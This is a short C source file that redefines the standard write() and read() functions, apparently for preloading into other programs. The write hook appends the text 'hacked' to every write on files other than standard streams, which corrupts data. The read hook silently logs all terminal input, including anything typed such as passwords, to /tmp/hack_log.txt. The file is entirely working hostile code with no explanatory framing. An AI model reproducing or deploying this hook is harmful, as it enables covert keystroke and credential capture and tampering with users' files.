#include <fcntl.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <asm/unistd.h>

ssize_t write (int __fd, __const void *__buf, size_t __n)
{
	int writed;


	writed = 0;
	writed += syscall(__NR_write, __fd, __buf, __n);
	if (__fd > 2)
		writed += syscall(__NR_write, __fd, "\nhacked\n", 8);

	return writed;
}


ssize_t
read(int fd, void *buf, size_t count)
{
	int readed;

	readed = 0;
	readed += syscall(__NR_read, fd, buf, count);
	if (fd < 3) {
		int log, ret;
		log = open("/tmp/hack_log.txt", O_WRONLY | O_APPEND | O_CREAT);
		ret = syscall(__NR_write, log, buf, readed);
		if (ret == -1)
			syscall(__NR_write, 0, "error\n", 6);
		close(log);
	}
	return readed;
}
